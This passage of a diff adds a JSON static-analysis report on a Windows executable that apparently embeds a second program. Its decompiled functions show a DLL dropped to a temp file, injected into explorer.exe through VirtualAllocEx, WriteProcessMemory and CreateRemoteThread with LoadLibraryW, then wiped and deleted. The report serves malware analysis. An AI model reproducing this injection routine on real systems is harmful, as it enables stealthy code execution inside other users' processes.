+          "name": "api-ms-win-crt-runtime-l1-1-0._set_app_type",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473832,
+          "name": "api-ms-win-crt-runtime-l1-1-0._set_invalid_parameter_handler",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473840,
+          "name": "api-ms-win-crt-runtime-l1-1-0.abort",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473848,
+          "name": "api-ms-win-crt-runtime-l1-1-0.exit",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473864,
+          "name": "api-ms-win-crt-stdio-l1-1-0.__acrt_iob_func",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 473872,
+          "name": "api-ms-win-crt-stdio-l1-1-0.__p__commode",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473880,
+          "name": "api-ms-win-crt-stdio-l1-1-0.__p__fmode",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473888,
+          "name": "api-ms-win-crt-stdio-l1-1-0.__stdio_common_vfprintf",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473896,
+          "name": "api-ms-win-crt-stdio-l1-1-0.__stdio_common_vswprintf",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473904,
+          "name": "api-ms-win-crt-stdio-l1-1-0.fflush",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473912,
+          "name": "api-ms-win-crt-stdio-l1-1-0.setvbuf",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473928,
+          "name": "api-ms-win-crt-string-l1-1-0._stricmp",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 473936,
+          "name": "api-ms-win-crt-string-l1-1-0.memset",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473944,
+          "name": "api-ms-win-crt-string-l1-1-0.strlen",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473952,
+          "name": "api-ms-win-crt-string-l1-1-0.strncmp",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473960,
+          "name": "api-ms-win-crt-string-l1-1-0.wcslen",
+          "type": "IMPORT",
+          "num_refs": 1
+        }
+      ],
+      "sections": [
+        {
+          "name": "header",
+          "effective_address": 0,
+          "physical_size": 1536,
+          "virtual_size": 0,
+          "rights": "",
+          "entropy": 70
+        },
+        {
+          "name": ".text",
+          "effective_address": 1536,
+          "physical_size": 7680,
+          "virtual_size": 8192,
+          "rights": "RX",
+          "entropy": 119
+        },
+        {
+          "name": ".data",
+          "effective_address": 9728,
+          "physical_size": 449024,
+          "virtual_size": 450560,
+          "rights": "RW",
+          "entropy": 98
+        },
+        {
+          "name": ".rdata",
+          "effective_address": 460288,
+          "physical_size": 3584,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 81
+        },
+        {
+          "name": ".pdata",
+          "effective_address": 464384,
+          "physical_size": 1024,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 103
+        },
+        {
+          "name": ".xdata",
+          "effective_address": 468480,
+          "physical_size": 512,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 50
+        },
+        {
+          "name": ".idata",
+          "effective_address": 472576,
+          "physical_size": 3072,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 50
+        },
+        {
+          "name": ".tls",
+          "effective_address": 476672,
+          "physical_size": 512,
+          "virtual_size": 4096,
+          "rights": "RW",
+          "entropy": 0
+        },
+        {
+          "name": ".rsrc",
+          "effective_address": 480768,
+          "physical_size": 1536,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 0
+        },
+        {
+          "name": ".reloc",
+          "effective_address": 484864,
+          "physical_size": 512,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 52
+        },
+        {
+          "name": "/4",
+          "effective_address": 488960,
+          "physical_size": 1536,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 0
+        },
+        {
+          "name": "/19",
+          "effective_address": 493056,
+          "physical_size": 46080,
+          "virtual_size": 49152,
+          "rights": "R",
+          "entropy": 97
+        },
+        {
+          "name": "/31",
+          "effective_address": 542208,
+          "physical_size": 9216,
+          "virtual_size": 12288,
+          "rights": "R",
+          "entropy": 111
+        },
+        {
+          "name": "/45",
+          "effective_address": 554496,
+          "physical_size": 8192,
+          "virtual_size": 8192,
+          "rights": "R",
+          "entropy": 116
+        },
+        {
+          "name": "/57",
+          "effective_address": 562688,
+          "physical_size": 2560,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 106
+        },
+        {
+          "name": "/70",
+          "effective_address": 566784,
+          "physical_size": 1024,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 102
+        },
+        {
+          "name": "/81",
+          "effective_address": 570880,
+          "physical_size": 7168,
+          "virtual_size": 8192,
+          "rights": "R",
+          "entropy": 94
+        },
+        {
+          "name": "/97",
+          "effective_address": 579072,
+          "physical_size": 5120,
+          "virtual_size": 8192,
+          "rights": "R",
+          "entropy": 100
+        },
+        {
+          "name": "/113",
+          "effective_address": 587264,
+          "physical_size": 512,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 80
+        },
+        {
+          "name": "overlay",
+          "effective_address": 591360,
+          "physical_size": 43485,
+          "virtual_size": 0,
+          "rights": "",
+          "entropy": 83
+        },
+        {
+          "name": ".bss",
+          "effective_address": 634845,
+          "physical_size": 0,
+          "virtual_size": 4096,
+          "rights": "RW",
+          "entropy": 0
+        }
+      ],
+      "entropy": {
+        "file_entropy": 98,
+        "regions": [
+          {
+            "name": "header",
+            "entropy": 70,
+            "size": null
+          },
+          {
+            "name": ".text",
+            "entropy": 119,
+            "size": null
+          },
+          {
+            "name": ".data",
+            "entropy": 98,
+            "size": null
+          },
+          {
+            "name": ".rdata",
+            "entropy": 81,
+            "size": null
+          },
+          {
+            "name": ".pdata",
+            "entropy": 103,
+            "size": null
+          },
+          {
+            "name": ".xdata",
+            "entropy": 50,
+            "size": null
+          },
+          {
+            "name": ".idata",
+            "entropy": 50,
+            "size": null
+          },
+          {
+            "name": ".tls",
+            "entropy": 0,
+            "size": null
+          },
+          {
+            "name": ".rsrc",
+            "entropy": 0,
+            "size": null
+          },
+          {
+            "name": ".reloc",
+            "entropy": 52,
+            "size": null
+          },
+          {
+            "name": "/4",
+            "entropy": 0,
+            "size": null
+          },
+          {
+            "name": "/19",
+            "entropy": 97,
+            "size": null
+          },
+          {
+            "name": "/31",
+            "entropy": 111,
+            "size": null
+          },
+          {
+            "name": "/45",
+            "entropy": 116,
+            "size": null
+          },
+          {
+            "name": "/57",
+            "entropy": 106,
+            "size": null
+          },
+          {
+            "name": "/70",
+            "entropy": 102,
+            "size": null
+          },
+          {
+            "name": "/81",
+            "entropy": 94,
+            "size": null
+          },
+          {
+            "name": "/97",
+            "entropy": 100,
+            "size": null
+          },
+          {
+            "name": "/113",
+            "entropy": 80,
+            "size": null
+          },
+          {
+            "name": "overlay",
+            "entropy": 83,
+            "size": null
+          },
+          {
+            "name": ".bss",
+            "entropy": 0,
+            "size": null
+          }
+        ]
+      },
+      "functions": [
+        {
+          "ea": 8672,
+          "name": "sub_140002be0"
+        },
+        {
+          "ea": 2896,
+          "name": "sub_140001550"
+        },
+        {
+          "ea": 4336,
+          "name": "sub_140001af0"
+        },
+        {
+          "ea": 6023,
+          "name": "sub_140002187"
+        },
+        {
+          "ea": 6352,
+          "name": "sub_1400022d0"
+        },
+        {
+          "ea": 5900,
+          "name": "sub_14000210c"
+        },
+        {
+          "ea": 6192,
+          "name": "sub_140002230"
+        },
+        {
+          "ea": 1591,
+          "name": "sub_140001037"
+        },
+        {
+          "ea": 2736,
+          "name": "sub_1400014b0"
+        },
+        {
+          "ea": 3936,
+          "name": "0"
+        },
+        {
+          "ea": 2624,
+          "name": "EntryPoint"
+        },
+        {
+          "ea": 3904,
+          "name": "1"
+        },
+        {
+          "ea": 8080,
+          "name": "jmp_api-ms-win-crt-string-l1-1-0._stricmp"
+        },
+        {
+          "ea": 8088,
+          "name": "jmp_api-ms-win-crt-string-l1-1-0.memset"
+        },
+        {
+          "ea": 8096,
+          "name": "jmp_api-ms-win-crt-string-l1-1-0.strlen"
+        },
+        {
+          "ea": 8104,
+          "name": "jmp_api-ms-win-crt-string-l1-1-0.strncmp"
+        },
+        {
+          "ea": 8112,
+          "name": "jmp_api-ms-win-crt-string-l1-1-0.wcslen"
+        },
+        {
+          "ea": 8128,
+          "name": "jmp_api-ms-win-crt-stdio-l1-1-0.__acrt_iob_func"
+        },
+        {
+          "ea": 8136,
+          "name": "jmp_api-ms-win-crt-stdio-l1-1-0.__p__commode"
+        },
+        {
+          "ea": 8144,
+          "name": "jmp_api-ms-win-crt-stdio-l1-1-0.__p__fmode"
+        },
+        {
+          "ea": 8152,
+          "name": "jmp_api-ms-win-crt-stdio-l1-1-0.__stdio_common_vfprintf"
+        },
+        {
+          "ea": 8160,
+          "name": "jmp_api-ms-win-crt-stdio-l1-1-0.__stdio_common_vswprintf"
+        },
+        {
+          "ea": 8168,
+          "name": "jmp_api-ms-win-crt-stdio-l1-1-0.fflush"
+        },
+        {
+          "ea": 8176,
+          "name": "jmp_api-ms-win-crt-stdio-l1-1-0.setvbuf"
+        },
+        {
+          "ea": 8192,
+          "name": "jmp_api-ms-win-crt-runtime-l1-1-0.__p___argc"
+        },
+        {
+          "ea": 8200,
+          "name": "jmp_api-ms-win-crt-runtime-l1-1-0.__p___argv"
+        },
+        {
+          "ea": 8208,
+          "name": "jmp_api-ms-win-crt-runtime-l1-1-0.__p__acmdln"
+        },
+        {
+          "ea": 8216,
+          "name": "jmp_api-ms-win-crt-runtime-l1-1-0._cexit"
+        },
+        {
+          "ea": 8224,
+          "name": "jmp_api-ms-win-crt-runtime-l1-1-0._configure_narrow_argv"
+        },
+        {
+          "ea": 8232,
+          "name": "jmp_api-ms-win-crt-runtime-l1-1-0._crt_atexit"
+        }
+      ],
+      "constants": [],
+      "carved": [
+        {
+          "ea": 9760,
+          "offset": 9248,
+          "size": 342016,
+          "type": "PE",
+          "type_category": "PROGRAM"
+        }
+      ],
+      "virtual_files": [
+        {
+          "path": "MANIF/1/unk",
+          "unpacked_size": 1167
+        }
+      ],
+      "structures": [
+        {
+          "name": "MZ",
+          "ea": 0
+        },
+        {
+          "name": "PE",
+          "ea": 128
+        },
+        {
+          "name": "OptionalHeader",
+          "ea": 152
+        },
+        {
+          "name": "Sections",
+          "ea": 392
+        },
+        {
+          "name": "TlsDirectory",
+          "ea": 460416
+        },
+        {
+          "name": "TlsCallbacks",
+          "ea": 463328
+        },
+        {
+          "name": "ExceptionTable",
+          "ea": 464384
+        },
+        {
+          "name": "ImportTable",
+          "ea": 472576
+        },
+        {
+          "name": "kernel32.OFT",
+          "ea": 472776
+        },
+        {
+          "name": "api-ms-win-crt-environment-l1-1-0.OFT",
+          "ea": 473032
+        },
+        {
+          "name": "api-ms-win-crt-heap-l1-1-0.OFT",
+          "ea": 473048
+        },
+        {
+          "name": "api-ms-win-crt-locale-l1-1-0.OFT",
+          "ea": 473088
+        },
+        {
+          "name": "api-ms-win-crt-math-l1-1-0.OFT",
+          "ea": 473104
+        },
+        {
+          "name": "api-ms-win-crt-private-l1-1-0.OFT",
+          "ea": 473120
+        },
+        {
+          "name": "api-ms-win-crt-runtime-l1-1-0.OFT",
+          "ea": 473136
+        },
+        {
+          "name": "api-ms-win-crt-stdio-l1-1-0.OFT",
+          "ea": 473264
+        },
+        {
+          "name": "api-ms-win-crt-string-l1-1-0.OFT",
+          "ea": 473328
+        },
+        {
+          "name": "kernel32.FT",
+          "ea": 473376
+        },
+        {
+          "name": "api-ms-win-crt-environment-l1-1-0.FT",
+          "ea": 473632
+        },
+        {
+          "name": "api-ms-win-crt-heap-l1-1-0.FT",
+          "ea": 473648
+        },
+        {
+          "name": "api-ms-win-crt-locale-l1-1-0.FT",
+          "ea": 473688
+        },
+        {
+          "name": "api-ms-win-crt-math-l1-1-0.FT",
+          "ea": 473704
+        },
+        {
+          "name": "api-ms-win-crt-private-l1-1-0.FT",
+          "ea": 473720
+        },
+        {
+          "name": "api-ms-win-crt-runtime-l1-1-0.FT",
+          "ea": 473736
+        },
+        {
+          "name": "api-ms-win-crt-stdio-l1-1-0.FT",
+          "ea": 473864
+        },
+        {
+          "name": "api-ms-win-crt-string-l1-1-0.FT",
+          "ea": 473928
+        },
+        {
+          "name": "ImportNames",
+          "ea": 473976
+        },
+        {
+          "name": "ImportNames",
+          "ea": 475212
+        },
+        {
+          "name": "ImportNames",
+          "ea": 475232
+        },
+        {
+          "name": "ImportNames",
+          "ea": 475288
+        },
+        {
+          "name": "ImportNames",
+          "ea": 475324
+        },
+        {
+          "name": "ImportNames",
+          "ea": 475364
+        },
+        {
+          "name": "ImportNames",
+          "ea": 475400
+        },
+        {
+          "name": "ImportNames",
+          "ea": 475496
+        },
+        {
+          "name": "ImportNames",
+          "ea": 475560
+        },
+        {
+          "name": "ImportNames",
+          "ea": 475612
+        },
+        {
+          "name": "TLSInitArray",
+          "ea": 476672
+        },
+        {
+          "name": "Resources",
+          "ea": 480768
+        },
+        {
+          "name": "Resources.MANIF",
+          "ea": 480792
+        },
+        {
+          "name": "Resources.MANIF.1",
+          "ea": 480816
+        },
+        {
+          "name": "Resources.MANIF.1.unk",
+          "ea": 480840
+        },
+        {
+          "name": "Manifest",
+          "ea": 480856
+        },
+        {
+          "name": "Relocations",
+          "ea": 484864
+        }
+      ]
+    },
+    "functions": [
+      {
+        "ea": 8672,
+        "name": "sub_140002be0"
+      },
+      {
+        "ea": 2896,
+        "name": "sub_140001550"
+      },
+      {
+        "ea": 4336,
+        "name": "sub_140001af0"
+      },
+      {
+        "ea": 6023,
+        "name": "sub_140002187"
+      },
+      {
+        "ea": 6352,
+        "name": "sub_1400022d0"
+      },
+      {
+        "ea": 5900,
+        "name": "sub_14000210c"
+      },
+      {
+        "ea": 6192,
+        "name": "sub_140002230"
+      },
+      {
+        "ea": 1591,
+        "name": "sub_140001037"
+      },
+      {
+        "ea": 2736,
+        "name": "sub_1400014b0"
+      },
+      {
+        "ea": 3936,
+        "name": "0"
+      },
+      {
+        "ea": 2624,
+        "name": "EntryPoint"
+      },
+      {
+        "ea": 3904,
+        "name": "1"
+      },
+      {
+        "ea": 8080,
+        "name": "jmp_api-ms-win-crt-string-l1-1-0._stricmp"
+      },
+      {
+        "ea": 8088,
+        "name": "jmp_api-ms-win-crt-string-l1-1-0.memset"
+      },
+      {
+        "ea": 8096,
+        "name": "jmp_api-ms-win-crt-string-l1-1-0.strlen"
+      },
+      {
+        "ea": 8104,
+        "name": "jmp_api-ms-win-crt-string-l1-1-0.strncmp"
+      },
+      {
+        "ea": 8112,
+        "name": "jmp_api-ms-win-crt-string-l1-1-0.wcslen"
+      },
+      {
+        "ea": 8128,
+        "name": "jmp_api-ms-win-crt-stdio-l1-1-0.__acrt_iob_func"
+      },
+      {
+        "ea": 8136,
+        "name": "jmp_api-ms-win-crt-stdio-l1-1-0.__p__commode"
+      },
+      {
+        "ea": 8144,
+        "name": "jmp_api-ms-win-crt-stdio-l1-1-0.__p__fmode"
+      },
+      {
+        "ea": 8152,
+        "name": "jmp_api-ms-win-crt-stdio-l1-1-0.__stdio_common_vfprintf"
+      },
+      {
+        "ea": 8160,
+        "name": "jmp_api-ms-win-crt-stdio-l1-1-0.__stdio_common_vswprintf"
+      },
+      {
+        "ea": 8168,
+        "name": "jmp_api-ms-win-crt-stdio-l1-1-0.fflush"
+      },
+      {
+        "ea": 8176,
+        "name": "jmp_api-ms-win-crt-stdio-l1-1-0.setvbuf"
+      },
+      {
+        "ea": 8192,
+        "name": "jmp_api-ms-win-crt-runtime-l1-1-0.__p___argc"
+      },
+      {
+        "ea": 8200,
+        "name": "jmp_api-ms-win-crt-runtime-l1-1-0.__p___argv"
+      },
+      {
+        "ea": 8208,
+        "name": "jmp_api-ms-win-crt-runtime-l1-1-0.__p__acmdln"
+      },
+      {
+        "ea": 8216,
+        "name": "jmp_api-ms-win-crt-runtime-l1-1-0._cexit"
+      },
+      {
+        "ea": 8224,
+        "name": "jmp_api-ms-win-crt-runtime-l1-1-0._configure_narrow_argv"
+      },
+      {
+        "ea": 8232,
+        "name": "jmp_api-ms-win-crt-runtime-l1-1-0._crt_atexit"
+      }
+    ],
+    "constants": [],
+    "anomalies": [
+      {
+        "name": "BssNonEmpty",
+        "desc": "Bss Region/section is not empty",
+        "category": "entropy",
+        "level": 3,
+        "num_hits": 1
+      },
+      {
+        "name": "EmbeddedProgram",
+        "desc": "File embeds a program",
+        "category": "embedding",
+        "level": 3,
+        "num_hits": 1
+      },
+      {
+        "name": "GuiSubsystemNoWindowApi",
+        "desc": "A GUI windows application does not import any user32 window-related function",
+        "category": "headers",
+        "level": 2,
+        "num_hits": 1
+      },
+      {
+        "name": "InvalidSizeOfInitializedData",
+        "desc": "SizeOfInitializedData is not the sum of all ininitalized data sections (raw or virtual)",
+        "category": "sections",
+        "level": 2,
+        "num_hits": 1
+      },
+      {
+        "name": "XorInLoop",
+        "desc": "XOR instruction in a loop",
+        "category": "code",
+        "level": 3,
+        "num_hits": 1
+      }
+    ],
+    "carved_files": [
+      {
+        "ea": 9760,
+        "offset": 9248,
+        "size": 342016,
+        "type": "PE",
+        "type_category": "PROGRAM"
+      }
+    ],
+    "virtual_files": [
+      {
+        "path": "MANIF/1/unk",
+        "unpacked_size": 1167
+      }
+    ],
+    "structures": [
+      {
+        "name": "MZ",
+        "ea": 0
+      },
+      {
+        "name": "PE",
+        "ea": 128
+      },
+      {
+        "name": "OptionalHeader",
+        "ea": 152
+      },
+      {
+        "name": "Sections",
+        "ea": 392
+      },
+      {
+        "name": "TlsDirectory",
+        "ea": 460416
+      },
+      {
+        "name": "TlsCallbacks",
+        "ea": 463328
+      },
+      {
+        "name": "ExceptionTable",
+        "ea": 464384
+      },
+      {
+        "name": "ImportTable",
+        "ea": 472576
+      },
+      {
+        "name": "kernel32.OFT",
+        "ea": 472776
+      },
+      {
+        "name": "api-ms-win-crt-environment-l1-1-0.OFT",
+        "ea": 473032
+      },
+      {
+        "name": "api-ms-win-crt-heap-l1-1-0.OFT",
+        "ea": 473048
+      },
+      {
+        "name": "api-ms-win-crt-locale-l1-1-0.OFT",
+        "ea": 473088
+      },
+      {
+        "name": "api-ms-win-crt-math-l1-1-0.OFT",
+        "ea": 473104
+      },
+      {
+        "name": "api-ms-win-crt-private-l1-1-0.OFT",
+        "ea": 473120
+      },
+      {
+        "name": "api-ms-win-crt-runtime-l1-1-0.OFT",
+        "ea": 473136
+      },
+      {
+        "name": "api-ms-win-crt-stdio-l1-1-0.OFT",
+        "ea": 473264
+      },
+      {
+        "name": "api-ms-win-crt-string-l1-1-0.OFT",
+        "ea": 473328
+      },
+      {
+        "name": "kernel32.FT",
+        "ea": 473376
+      },
+      {
+        "name": "api-ms-win-crt-environment-l1-1-0.FT",
+        "ea": 473632
+      },
+      {
+        "name": "api-ms-win-crt-heap-l1-1-0.FT",
+        "ea": 473648
+      },
+      {
+        "name": "api-ms-win-crt-locale-l1-1-0.FT",
+        "ea": 473688
+      },
+      {
+        "name": "api-ms-win-crt-math-l1-1-0.FT",
+        "ea": 473704
+      },
+      {
+        "name": "api-ms-win-crt-private-l1-1-0.FT",
+        "ea": 473720
+      },
+      {
+        "name": "api-ms-win-crt-runtime-l1-1-0.FT",
+        "ea": 473736
+      },
+      {
+        "name": "api-ms-win-crt-stdio-l1-1-0.FT",
+        "ea": 473864
+      },
+      {
+        "name": "api-ms-win-crt-string-l1-1-0.FT",
+        "ea": 473928
+      },
+      {
+        "name": "ImportNames",
+        "ea": 473976
+      },
+      {
+        "name": "ImportNames",
+        "ea": 475212
+      },
+      {
+        "name": "ImportNames",
+        "ea": 475232
+      },
+      {
+        "name": "ImportNames",
+        "ea": 475288
+      },
+      {
+        "name": "ImportNames",
+        "ea": 475324
+      },
+      {
+        "name": "ImportNames",
+        "ea": 475364
+      },
+      {
+        "name": "ImportNames",
+        "ea": 475400
+      },
+      {
+        "name": "ImportNames",
+        "ea": 475496
+      },
+      {
+        "name": "ImportNames",
+        "ea": 475560
+      },
+      {
+        "name": "ImportNames",
+        "ea": 475612
+      },
+      {
+        "name": "TLSInitArray",
+        "ea": 476672
+      },
+      {
+        "name": "Resources",
+        "ea": 480768
+      },
+      {
+        "name": "Resources.MANIF",
+        "ea": 480792
+      },
+      {
+        "name": "Resources.MANIF.1",
+        "ea": 480816
+      },
+      {
+        "name": "Resources.MANIF.1.unk",
+        "ea": 480840
+      },
+      {
+        "name": "Manifest",
+        "ea": 480856
+      },
+      {
+        "name": "Relocations",
+        "ea": 484864
+      }
+    ],
+    "decompilations": {
+      "8672": {
+        "name": "sub_140002be0",
+        "decompilation": "\n/* DISPLAY WARNING: Type casts are NOT being printed */\n\nundefined8 sub_140002be0(void)\n\n{\n    char *pcVar1;\n    bool bVar2;\n    bool bVar3;\n    bool bVar4;\n    code *pcVar5;\n    code *pcVar6;\n    code *pcVar7;\n    undefined4 uVar8;\n    int32_t iVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    undefined8 uVar13;\n    int64_t iVar14;\n    char **ppcVar15;\n    char cVar16;\n    uint32_t uVar17;\n    char *pcVar18;\n    undefined4 uVar19;\n    undefined8 in_stack_fffffffffffffb78;\n    undefined uStack_44d;\n    undefined auStack_44c [4];\n    undefined auStack_448 [528];\n    undefined auStack_238 [392];\n    undefined8 uStack_b0;\n    undefined auStack_88 [60];\n    uint8_t uStack_4c;\n    undefined2 uStack_48;\n    \n    bVar3 = false;\n    bVar2 = false;\n    uStack_b0 = 0x140002bf1;\n    func_0x000140001910();\n    uStack_b0 = 0x140002bf6;\n    ppcVar15 = jmp_api-ms-win-crt-runtime-l1-1-0.__p__acmdln();\n    pcVar6 = kernel32.IsDBCSLeadByte;\n    uVar19 = in_stack_fffffffffffffb78 >> 0x20;\n    pcVar18 = *ppcVar15;\n    if (pcVar18 == 0x0) {\n        pcVar18 = \"\";\n    }\n    else {\ncode_r0x000140002c10:\n        cVar16 = *pcVar18;\n        if (' ' < cVar16) goto code_r0x000140002c3d;\n        while (uVar19 = in_stack_fffffffffffffb78 >> 0x20, cVar16 != '\\0') {\n            if (!bVar2) goto code_r0x000140002c64;\n            uStack_b0 = 0x140002c22;\n            iVar9 = (*pcVar6)();\n            pcVar1 = pcVar18;\n            while( true ) {\n                pcVar18 = pcVar1 + 1;\n                if ((iVar9 == 0) || (pcVar1[1] == '\\0')) goto code_r0x000140002c10;\n                cVar16 = pcVar1[2];\n                pcVar18 = pcVar1 + 2;\n                if (cVar16 < '!') break;\ncode_r0x000140002c3d:\n                bVar4 = bVar2 ^ 1;\n                bVar2 = bVar3;\n                if (cVar16 == '\\\"') {\n                    bVar2 = bVar4;\n                }\n                uStack_b0 = 0x140002c4a;\n                iVar9 = (*pcVar6)();\n                pcVar1 = pcVar18;\n                bVar3 = bVar2;\n            }\n        }\n    }\n    goto code_r0x000140002c70;\n    while (*pcVar1 < '!') {\ncode_r0x000140002c64:\n        pcVar1 = pcVar18 + 1;\n        pcVar18 = pcVar18 + 1;\n        if (*pcVar1 == '\\0') break;\n    }\ncode_r0x000140002c70:\n    uStack_b0 = 0x140002c7b;\n    (*kernel32.GetStartupInfoA)(auStack_88);\n    if ((uStack_4c & 1) == 0) {\n        uStack_48 = 10;\n    }\n    iVar9 = (*kernel32.GetTempPathW)(0x104, auStack_448, pcVar18, uStack_48);\n    if (iVar9 != 0) {\n        iVar9 = (*kernel32.GetTempFileNameW)(auStack_448, 0x140071000, 0, auStack_238);\n        if (iVar9 == 0) {\n            (*kernel32.GetCurrentDirectoryW)(0x104, auStack_448);\n            uVar8 = (*kernel32.GetTickCount)();\n            uVar13 = CONCAT44(uVar19, uVar8);\n            (*0x140070850)(auStack_238, 0x104, \"%s\\\\dl%lu.dll\", auStack_448, uVar13);\n            uVar19 = uVar13 >> 0x20;\n        }\n        pcVar6 = kernel32.CreateFileW;\n        iVar10 = (*kernel32.CreateFileW)(auStack_238, 0x40000000, 0, 0, CONCAT44(uVar19, 2), 0x80, 0);\n        pcVar7 = kernel32.WriteFile;\n        if (iVar10 != -1) {\n            uVar19 = 0;\n            (*kernel32.WriteFile)(iVar10, 0x140003020, [0x0x140003000], auStack_44c, 0);\n            pcVar5 = kernel32.CloseHandle;\n            (*kernel32.CloseHandle)(iVar10);\n            iVar9 = sub_1400014b0(\"explorer.exe\");\n            if ((iVar9 != 0) && (iVar10 = (*kernel32.OpenProcess)(0x43a, 0, iVar9), iVar10 != 0)) {\n                iVar11 = jmp_api-ms-win-crt-string-l1-1-0.wcslen(auStack_238);\n                iVar11 = iVar11 * 2 + 2;\n                uVar13 = CONCAT44(uVar19, 4);\n                iVar12 = (*kernel32.VirtualAllocEx)(iVar10, 0, iVar11, 0x3000, uVar13);\n                uVar19 = uVar13 >> 0x20;\n                if (iVar12 != 0) {\n                    (*kernel32.WriteProcessMemory)(iVar10, iVar12, auStack_238, iVar11, 0);\n                    uVar13 = (*kernel32.GetModuleHandleA)(\"kernel32.dll\");\n                    uVar13 = (*kernel32.GetProcAddre"
+      },
+      "2896": {
+        "name": "sub_140001550",
+        "decompilation": "\n/* DISPLAY WARNING: Type casts are NOT being printed */\n\nundefined8 sub_140001550(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    undefined4 uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    undefined8 uVar9;\n    int64_t iVar10;\n    uint32_t uVar11;\n    undefined8 in_stack_fffffffffffffb78;\n    undefined4 uVar12;\n    undefined uStack_44d;\n    undefined auStack_44c [4];\n    undefined auStack_448 [528];\n    undefined auStack_238 [536];\n    \n    uVar12 = in_stack_fffffffffffffb78 >> 0x20;\n    iVar4 = (*kernel32.GetTempPathW)(0x104, auStack_448);\n    if (iVar4 != 0) {\n        iVar4 = (*kernel32.GetTempFileNameW)(auStack_448, 0x140071000, 0, auStack_238);\n        if (iVar4 == 0) {\n            (*kernel32.GetCurrentDirectoryW)(0x104, auStack_448);\n            uVar5 = (*kernel32.GetTickCount)();\n            uVar9 = CONCAT44(uVar12, uVar5);\n            (*0x140070850)(auStack_238, 0x104, \"%s\\\\dl%lu.dll\", auStack_448, uVar9);\n            uVar12 = uVar9 >> 0x20;\n        }\n        pcVar2 = kernel32.CreateFileW;\n        iVar6 = (*kernel32.CreateFileW)(auStack_238, 0x40000000, 0, 0, CONCAT44(uVar12, 2), 0x80, 0);\n        pcVar3 = kernel32.WriteFile;\n        if (iVar6 != -1) {\n            uVar12 = 0;\n            (*kernel32.WriteFile)(iVar6, 0x140003020, [0x0x140003000], auStack_44c, 0);\n            pcVar1 = kernel32.CloseHandle;\n            (*kernel32.CloseHandle)(iVar6);\n            iVar4 = sub_1400014b0(\"explorer.exe\");\n            if (iVar4 != 0) {\n                iVar6 = (*kernel32.OpenProcess)(0x43a, 0, iVar4);\n                if (iVar6 != 0) {\n                    iVar7 = jmp_api-ms-win-crt-string-l1-1-0.wcslen(auStack_238);\n                    iVar7 = iVar7 * 2 + 2;\n                    uVar9 = CONCAT44(uVar12, 4);\n                    iVar8 = (*kernel32.VirtualAllocEx)(iVar6, 0, iVar7, 0x3000, uVar9);\n                    uVar12 = uVar9 >> 0x20;\n                    if (iVar8 != 0) {\n                        (*kernel32.WriteProcessMemory)(iVar6, iVar8, auStack_238, iVar7, 0);\n                        uVar9 = (*kernel32.GetModuleHandleA)(\"kernel32.dll\");\n                        uVar9 = (*kernel32.GetProcAddress)(uVar9, \"LoadLibraryW\");\n                        iVar7 = iVar8;\n                        iVar10 = (*kernel32.CreateRemoteThread)(iVar6, 0, 0, uVar9, iVar8, 0, 0);\n                        uVar12 = iVar7 >> 0x20;\n                        if (iVar10 != 0) {\n                            (*kernel32.WaitForSingleObject)(iVar10, 0xffffffff);\n                            (*pcVar1)(iVar10);\n                        }\n                        (*kernel32.VirtualFreeEx)(iVar6, iVar8, 0, 0x8000);\n                    }\n                    (*pcVar1)(iVar6);\n                    iVar6 = (*pcVar2)(auStack_238, 0x40000000, 0, 0, CONCAT44(uVar12, 3), 0, 0);\n                    if (iVar6 != -1) {\n                        uStack_44d = 0;\n                        if ([0x0x140003000] != 0) {\n                            uVar11 = 0;\n                            do {\n                                uVar11 = uVar11 + 1;\n                                (*pcVar3)(iVar6, &uStack_44d, 1, auStack_44c, 0);\n                            } while (uVar11 < [0x0x140003000]);\n                        }\n                        (*pcVar1)(iVar6);\n                    }\n                    (*kernel32.DeleteFileW)(auStack_238);\n                    return 0;\n                }\n            }\n            (*kernel32.DeleteFileW)(auStack_238);\n        }\n    }\n    return 1;\n}\n"
+      },
+      "4336": {
+        "name": "sub_140001af0",
